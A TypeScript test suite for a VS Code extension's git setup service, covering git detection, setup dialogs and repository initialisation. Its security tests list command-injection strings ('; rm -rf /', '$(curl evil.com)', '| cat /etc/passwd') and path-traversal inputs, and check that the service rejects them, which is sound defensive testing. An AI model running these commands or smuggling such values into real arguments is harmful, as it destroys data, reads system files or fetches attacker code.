import * as assert from 'assert';
import * as vscode from 'vscode';
import * as sinon from 'sinon';
import { spawn } from 'child_process';
import { EventEmitter } from 'events';
import { GitSetupService } from '../../services/gitSetupService';

suite('GitSetupService Tests', () => {
  let gitSetupService: GitSetupService;
  let mockContext: vscode.ExtensionContext;
  let sandbox: sinon.SinonSandbox;

  setup(() => {
    sandbox = sinon.createSandbox();

    // Create mock extension context
    mockContext = {
      subscriptions: [],
      workspaceState: {
        get: sandbox.stub().returns(false),
        update: sandbox.stub().resolves(),
      },
      globalState: {
        get: sandbox.stub(),
        update: sandbox.stub().resolves(),
      },
      asAbsolutePath: sandbox.stub(),
      extensionPath: '/test/path',
      extensionMode: vscode.ExtensionMode.Test,
      storageUri: vscode.Uri.file('/test/storage'),
      globalStorageUri: vscode.Uri.file('/test/global'),
      logUri: vscode.Uri.file('/test/log'),
      secrets: {} as any,
      extensionUri: vscode.Uri.file('/test/extension'),
      environmentVariableCollection: {} as any,
      extension: {} as any,
      storageFileSystem: {} as any,
      logFileSystem: {} as any,
      globalStorageFileSystem: {} as any
    } as vscode.ExtensionContext;

    gitSetupService = new GitSetupService(mockContext);
  });

  teardown(() => {
    sandbox.restore();
    gitSetupService.dispose();
  });

  suite('Git Status Detection', () => {
    test('should detect git installation correctly', async () => {
      // Mock successful spawn for git --version
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.withArgs('git', ['--version']).returns(mockProcess);

      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      // Mock successful spawn for git rev-parse
      const mockRepoProcess = new EventEmitter() as any;
      mockRepoProcess.kill = sandbox.stub();
      spawnStub.withArgs('git', ['rev-parse', '--git-dir']).returns(mockRepoProcess);

      // Trigger successful responses
      setTimeout(() => {
        mockProcess.emit('close', 0);
        mockRepoProcess.emit('close', 0);
      }, 10);

      const status = await gitSetupService.getGitStatus();

      assert.strictEqual(status.hasGit, true);
      assert.strictEqual(status.hasRepository, true);
      assert.strictEqual(status.workspaceFolder, '/test/workspace');
    });

    test('should handle git not installed', async () => {
      // Mock failed spawn for git --version
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.withArgs('git', ['--version']).returns(mockProcess);

      // Trigger error response
      setTimeout(() => {
        mockProcess.emit('error', new Error('Command not found'));
      }, 10);

      const status = await gitSetupService.getGitStatus();

      assert.strictEqual(status.hasGit, false);
      assert.strictEqual(status.hasRepository, false);
      assert.strictEqual(status.workspaceFolder, null);
    });

    test('should handle git installed but no repository', async () => {
      // Mock successful spawn for git --version
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.withArgs('git', ['--version']).returns(mockProcess);

      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      // Mock failed spawn for git rev-parse
      const mockRepoProcess = new EventEmitter() as any;
      mockRepoProcess.kill = sandbox.stub();
      spawnStub.withArgs('git', ['rev-parse', '--git-dir']).returns(mockRepoProcess);

      // Trigger responses
      setTimeout(() => {
        mockProcess.emit('close', 0); // git --version succeeds
        mockRepoProcess.emit('close', 1); // git rev-parse fails
      }, 10);

      const status = await gitSetupService.getGitStatus();

      assert.strictEqual(status.hasGit, true);
      assert.strictEqual(status.hasRepository, false);
      assert.strictEqual(status.workspaceFolder, '/test/workspace');
    });

    test('should handle no workspace folder', async () => {
      // Mock successful spawn for git --version
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.withArgs('git', ['--version']).returns(mockProcess);

      // Mock no workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value(undefined);

      // Trigger successful response
      setTimeout(() => {
        mockProcess.emit('close', 0);
      }, 10);

      const status = await gitSetupService.getGitStatus();

      assert.strictEqual(status.hasGit, true);
      assert.strictEqual(status.hasRepository, false);
      assert.strictEqual(status.workspaceFolder, null);
    });
  });

  suite('Status Bar Management', () => {
    test('should update status bar for git ready state', async () => {
      // Mock git detection
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: true,
        workspaceFolder: '/test/workspace'
      });

      await gitSetupService.updateStatusBar();

      // Verify status bar shows success state
      // Note: In actual implementation, we would need to access the status bar item
      // This test structure shows how we would verify the status bar updates
      assert.ok(true, 'Status bar should show git ready state');
    });

    test('should update status bar for no repository state', async () => {
      // Mock git installed but no repository
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      await gitSetupService.updateStatusBar();

      // Verify status bar shows warning state
      assert.ok(true, 'Status bar should show no repository warning');
    });

    test('should update status bar for no git state', async () => {
      // Mock git not installed
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: false,
        hasRepository: false,
        workspaceFolder: null
      });

      await gitSetupService.updateStatusBar();

      // Verify status bar shows error state
      assert.ok(true, 'Status bar should show no git error');
    });
  });

  suite('Git Setup Guidance', () => {
    test('should not show guidance when git is ready', async () => {
      // Mock git ready state
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: true,
        workspaceFolder: '/test/workspace'
      });

      const showMessageSpy = sandbox.spy(vscode.window, 'showInformationMessage');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(showMessageSpy.notCalled, 'Should not show guidance when git is ready');
    });

    test('should not show guidance when dismissed', async () => {
      // Mock dismissed state
      (mockContext.workspaceState.get as sinon.SinonStub).returns(true);

      // Mock git not ready state
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: false,
        hasRepository: false,
        workspaceFolder: null
      });

      const showMessageSpy = sandbox.spy(vscode.window, 'showInformationMessage');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(showMessageSpy.notCalled, 'Should not show guidance when dismissed');
    });

    test('should show git installation guidance when git not installed', async () => {
      // Mock git not installed
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: false,
        hasRepository: false,
        workspaceFolder: null
      });

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('Dismiss');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(showMessageStub.calledOnce, 'Should show guidance dialog');
      const args = showMessageStub.getCall(0).args;
      assert.ok(args[0].includes('Git is not installed'), 'Should show git installation message');
      assert.ok(args[2].includes('Install Git Guide'), 'Should offer install guide action');
    });

    test('should show repository setup guidance when git installed but no repo', async () => {
      // Mock git installed but no repository
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('Dismiss');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(showMessageStub.calledOnce, 'Should show guidance dialog');
      const args = showMessageStub.getCall(0).args;
      assert.ok(args[0].includes('Git repository'), 'Should show repository setup message');
      assert.ok(args[2].includes('Clone Repository'), 'Should offer clone action');
      assert.ok(args[3].includes('Initialize Repository'), 'Should offer init action');
      assert.ok(args[4].includes('Open Folder'), 'Should offer open folder action');
    });
  });

  suite('Git Setup Actions', () => {
    test('should handle clone repository action', async () => {
      // Mock git installed but no repository
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      const executeCommandSpy = sandbox.spy(vscode.commands, 'executeCommand');
      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('Clone Repository');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(executeCommandSpy.calledWith('git.clone'), 'Should execute git clone command');
    });

    test('should handle initialize repository action', async () => {
      // Mock git installed but no repository
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');

      // Mock user selections
      showMessageStub.onCall(0).resolves('Initialize Repository');
      showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
      showMessageStub.onCall(2).resolves('No'); // Skip initial commit

      const promise = gitSetupService.showGitSetupGuidance();

      setTimeout(() => {
        mockProcess.emit('close', 0); // git init succeeds
      }, 10);

      await promise;

      assert.ok(spawnStub.calledWith('git', ['init']),
        'Should execute git init command with spawn');
    });

    test('should handle open folder action', async () => {
      // Mock git installed but no repository
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      const executeCommandSpy = sandbox.spy(vscode.commands, 'executeCommand');
      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('Open Folder');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(executeCommandSpy.calledWith('vscode.openFolder'), 'Should execute open folder command');
    });

    test('should handle dont show again action', async () => {
      // Mock git not installed
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: false,
        hasRepository: false,
        workspaceFolder: null
      });

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');
      showMessageStub.onCall(0).resolves('Don\'t Show Again');
      showMessageStub.onCall(1).resolves(); // Dismiss confirmation message

      await gitSetupService.showGitSetupGuidance();

      assert.ok((mockContext.workspaceState.update as sinon.SinonStub).calledWith('gadugi.gitSetup.dismissed', true),
        'Should update dismiss preference');
    });
  });

  suite('Repository Initialization', () => {
    test('should initialize repository with initial commit', async () => {
      // Mock successful git commands
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      // Mock VS Code workspace fs API
      const mockFs = {
        stat: sandbox.stub().rejects(new Error('File not found')), // .gitignore doesn't exist
        writeFile: sandbox.stub().resolves()
      };
      sandbox.stub(vscode.workspace, 'fs').value(mockFs);

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');

      // Test through public interface
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      showMessageStub.onCall(0).resolves('Initialize Repository');
      showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
      showMessageStub.onCall(2).resolves('Yes'); // Create initial commit

      const promise = gitSetupService.showGitSetupGuidance();

      // Simulate successful git commands
      setTimeout(() => {
        mockProcess.emit('close', 0); // git init succeeds
        setTimeout(() => {
          mockProcess.emit('close', 0); // git add succeeds
          setTimeout(() => {
            mockProcess.emit('close', 0); // git commit succeeds
          }, 10);
        }, 10);
      }, 10);

      await promise;

      assert.ok(spawnStub.calledWith('git', ['init']), 'Should execute git init');
      assert.ok(spawnStub.calledWith('git', ['add', '.']), 'Should add files to git');
      assert.ok(spawnStub.calledWith('git', ['commit', '-m', 'Initial commit']), 'Should create initial commit');
    });

    test('should handle git init errors gracefully', async () => {
      // Mock failed git init
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();
      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');

      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      showMessageStub.onCall(0).resolves('Initialize Repository');
      showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization

      const promise = gitSetupService.showGitSetupGuidance();

      setTimeout(() => {
        mockProcess.stderr.emit('data', 'Git init failed');
        mockProcess.emit('close', 1); // git init fails
      }, 10);

      await promise;

      assert.ok(showErrorStub.calledOnce, 'Should show error message on git init failure');
    });
  });

  suite('Dismiss Preference Management', () => {
    test('should reset dismiss preference', async () => {
      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves();

      await gitSetupService.resetDismissPreference();

      assert.ok((mockContext.workspaceState.update as sinon.SinonStub).calledWith('gadugi.gitSetup.dismissed', false),
        'Should reset dismiss preference to false');
      assert.ok(showMessageStub.calledOnce, 'Should show confirmation message');
    });

    test('should check dismiss preference correctly', async () => {
      // Mock dismissed state
      (mockContext.workspaceState.get as sinon.SinonStub).returns(true);

      // Mock git not ready state
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: false,
        hasRepository: false,
        workspaceFolder: null
      });

      const showMessageSpy = sandbox.spy(vscode.window, 'showInformationMessage');

      await gitSetupService.showGitSetupGuidance();

      assert.ok(showMessageSpy.notCalled, 'Should respect dismiss preference');
      assert.ok((mockContext.workspaceState.get as sinon.SinonStub).calledWith('gadugi.gitSetup.dismissed', false),
        'Should check dismiss preference');
    });
  });

  suite('Git Status Details', () => {
    test('should show detailed status when all prerequisites met', async () => {
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: true,
        workspaceFolder: '/test/workspace'
      });

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('OK');

      await gitSetupService.showGitStatusDetails();

      assert.ok(showMessageStub.calledOnce, 'Should show status details');
      const message = showMessageStub.getCall(0).args[0];
      assert.ok(message.includes('Git is installed'), 'Should show git installed status');
      assert.ok(message.includes('Git repository detected'), 'Should show repository status');
      assert.ok(message.includes('All prerequisites met'), 'Should show success message');
    });

    test('should show detailed status with missing prerequisites', async () => {
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: false,
        hasRepository: false,
        workspaceFolder: null
      });

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('OK');

      await gitSetupService.showGitStatusDetails();

      assert.ok(showMessageStub.calledOnce, 'Should show status details');
      const message = showMessageStub.getCall(0).args[0];
      assert.ok(message.includes('Git is not installed'), 'Should show git not installed status');
      assert.ok(message.includes('No workspace folder'), 'Should show workspace status');
    });

    test('should offer setup actions from status details', async () => {
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves('Setup Git Repository');

      await gitSetupService.showGitStatusDetails();

      assert.ok(showMessageStub.calledTwice, 'Should show status details and handle action');
      const actions = showMessageStub.getCall(0).args[3]; // Fourth argument should be action buttons
      assert.ok(actions.includes('Setup Git Repository'), 'Should offer setup action');
    });
  });

  // =====================================================
  // SECURITY TEST SUITE - Added per code review feedback
  // =====================================================

  suite('Security Tests - Command Injection Prevention', () => {
    test('should prevent command injection in git arguments', async () => {
      // Mock malicious git arguments
      const maliciousArgs = ['init', '; rm -rf /'];

      let errorThrown = false;
      try {
        // Access the private method for testing (in real implementation, we'd use a test helper)
        const method = (gitSetupService as any).executeGitCommand;
        if (method) {
          await method.call(gitSetupService, maliciousArgs, '/test/workspace');
        }
      } catch (error) {
        errorThrown = true;
        assert.ok(error instanceof Error);
        assert.ok(error.message.includes('Invalid characters'), 'Should reject malicious arguments');
      }

      assert.ok(errorThrown, 'Should throw error for malicious arguments');
    });

    test('should sanitize git command arguments', async () => {
      // Test various injection attempts
      const maliciousArguments = [
        ['init', '&& echo hacked'],
        ['init', '| cat /etc/passwd'],
        ['init', '`rm -rf /`'],
        ['init', '$(curl evil.com)']
      ];

      for (const args of maliciousArguments) {
        let errorThrown = false;
        try {
          const method = (gitSetupService as any).executeGitCommand;
          if (method) {
            await method.call(gitSetupService, args, '/test/workspace');
          }
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('Invalid characters'),
            `Should reject malicious arguments: ${args.join(' ')}`);
        }

        assert.ok(errorThrown, `Should reject malicious arguments: ${args.join(' ')}`);
      }
    });

    test('should use spawn with argument array instead of shell execution', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      // Test that spawn is called with separate arguments
      const method = (gitSetupService as any).executeGitCommand;
      if (method) {
        const promise = method.call(gitSetupService, ['init'], '/test/workspace');

        setTimeout(() => {
          mockProcess.emit('close', 0);
        }, 10);

        await promise;

        assert.ok(spawnStub.calledOnce, 'Should call spawn');
        const spawnArgs = spawnStub.getCall(0).args;
        assert.strictEqual(spawnArgs[0], 'git', 'Should call git command');
        assert.deepStrictEqual(spawnArgs[1], ['init'], 'Should pass arguments as array');
        assert.ok(spawnArgs[2].cwd, 'Should set working directory');
      }
    });
  });

  suite('Security Tests - Path Traversal Prevention', () => {
    test('should validate workspace paths', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      // Test path traversal attempts
      const maliciousPaths = [
        '../../../etc/passwd',
        '/etc/passwd',
        '../../../../tmp/evil',
        '/tmp/outside-workspace'
      ];

      for (const maliciousPath of maliciousPaths) {
        let errorThrown = false;
        try {
          const method = (gitSetupService as any).validateWorkspacePath;
          if (method) {
            method.call(gitSetupService, maliciousPath);
          }
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('outside workspace boundary'),
            `Should reject path traversal: ${maliciousPath}`);
        }

        assert.ok(errorThrown, `Should reject path traversal: ${maliciousPath}`);
      }
    });

    test('should only allow paths within workspace', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      // Test valid paths within workspace
      const validPaths = [
        '/test/workspace',
        '/test/workspace/subfolder',
        '/test/workspace/deep/nested/folder'
      ];

      for (const validPath of validPaths) {
        const method = (gitSetupService as any).validateWorkspacePath;
        if (method) {
          const result = method.call(gitSetupService, validPath);
          assert.ok(result, `Should accept valid workspace path: ${validPath}`);
          assert.ok(result.startsWith('/test/workspace'), 'Should resolve to workspace');
        }
      }
    });

    test('should handle empty or null paths', async () => {
      const method = (gitSetupService as any).validateWorkspacePath;
      if (method) {
        // Test empty string
        let errorThrown = false;
        try {
          method.call(gitSetupService, '');
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('cannot be empty'));
        }
        assert.ok(errorThrown, 'Should reject empty path');

        // Test null workspace
        sandbox.stub(vscode.workspace, 'workspaceFolders').value(undefined);
        errorThrown = false;
        try {
          method.call(gitSetupService, '/some/path');
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('No workspace folder'));
        }
        assert.ok(errorThrown, 'Should reject when no workspace');
      }
    });
  });

  suite('Security Tests - Timeout and Error Handling', () => {
    test('should timeout git commands appropriately', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      const method = (gitSetupService as any).executeGitCommand;
      if (method) {
        let errorThrown = false;
        try {
          const promise = method.call(gitSetupService, ['init'], '/test/workspace');

          // Don't emit close event to simulate hanging process
          // The timeout should trigger

          await promise;
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('timed out'), 'Should timeout hanging process');
        }

        assert.ok(errorThrown, 'Should throw timeout error');
        assert.ok(mockProcess.kill.called, 'Should kill hanging process');
      }
    });

    test('should handle git command failures gracefully', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      const method = (gitSetupService as any).executeGitCommand;
      if (method) {
        let errorThrown = false;
        try {
          const promise = method.call(gitSetupService, ['init'], '/test/workspace');

          setTimeout(() => {
            mockProcess.stderr.emit('data', 'Git command failed');
            mockProcess.emit('close', 1); // Non-zero exit code
          }, 10);

          await promise;
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('Git command failed'), 'Should include stderr output');
        }

        assert.ok(errorThrown, 'Should throw error for failed git command');
      }
    });

    test('should handle process spawn errors', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      const method = (gitSetupService as any).executeGitCommand;
      if (method) {
        let errorThrown = false;
        try {
          const promise = method.call(gitSetupService, ['init'], '/test/workspace');

          setTimeout(() => {
            mockProcess.emit('error', new Error('spawn ENOENT'));
          }, 10);

          await promise;
        } catch (error) {
          errorThrown = true;
          assert.ok(error instanceof Error);
          assert.ok(error.message.includes('Git command error'));
        }

        assert.ok(errorThrown, 'Should handle spawn errors');
      }
    });
  });

  suite('Security Tests - Input Validation', () => {
    test('should validate argument types', async () => {
      const method = (gitSetupService as any).executeGitCommand;
      if (method) {
        // Test non-string arguments
        const invalidArgs = [
          [123, 'init'], // number
          [null, 'init'], // null
          [undefined, 'init'], // undefined
          [{ cmd: 'init' }, 'init'] // object
        ];

        for (const args of invalidArgs) {
          let errorThrown = false;
          try {
            await method.call(gitSetupService, args as any, '/test/workspace');
          } catch (error) {
            errorThrown = true;
            assert.ok(error instanceof Error);
            assert.ok(error.message.includes('must be strings'),
              `Should reject non-string arguments: ${JSON.stringify(args)}`);
          }

          assert.ok(errorThrown, `Should reject non-string arguments: ${JSON.stringify(args)}`);
        }
      }
    });

    test('should prevent repository URL injection in clone operations', async () => {
      // Mock git ready state but no repository
      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
        hasGit: true,
        hasRepository: false,
        workspaceFolder: '/test/workspace'
      });

      const executeCommandSpy = sandbox.spy(vscode.commands, 'executeCommand');
      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage')
        .resolves('Clone Repository');

      await gitSetupService.showGitSetupGuidance();

      // Verify that we delegate to VS Code's built-in git.clone command
      // rather than handling URLs ourselves (prevents URL injection)
      assert.ok(executeCommandSpy.calledWith('git.clone'),
        'Should delegate to VS Code git.clone to prevent URL injection');
    });
  });

  suite('Security Tests - File System Operations', () => {
    test('should use VS Code workspace API instead of direct fs operations', async () => {
      // Mock workspace
      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: vscode.Uri.file('/test/workspace') }
      ]);

      // Mock VS Code workspace fs API
      const mockFs = {
        stat: sandbox.stub().rejects(new Error('File not found')), // .gitignore doesn't exist
        writeFile: sandbox.stub().resolves()
      };
      sandbox.stub(vscode.workspace, 'fs').value(mockFs);

      // Mock git commands
      const mockProcess = new EventEmitter() as any;
      mockProcess.kill = sandbox.stub();
      mockProcess.stderr = new EventEmitter();
      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
      spawnStub.returns(mockProcess);

      // Mock confirmation dialogs
      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');
      showMessageStub.onCall(0).resolves('Initialize Repository');
      showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
      showMessageStub.onCall(2).resolves('Yes'); // Create initial commit

      // Start the test
      const promise = gitSetupService.showGitSetupGuidance();

      setTimeout(() => {
        mockProcess.emit('close', 0); // git init succeeds
        setTimeout(() => {
          mockProcess.emit('close', 0); // git add succeeds
          setTimeout(() => {
            mockProcess.emit('close', 0); // git commit succeeds
          }, 10);
        }, 10);
      }, 10);

      await promise;

      // Verify VS Code APIs were used instead of direct file system access
      assert.ok(mockFs.stat.calledOnce, 'Should check file existence via VS Code API');
      assert.ok(mockFs.writeFile.calledOnce, 'Should write file via VS Code API');
    });
  });
});
